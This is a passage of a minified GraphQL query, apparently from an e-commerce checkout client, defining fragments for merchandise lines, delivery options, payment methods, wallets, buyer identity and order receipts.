ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode 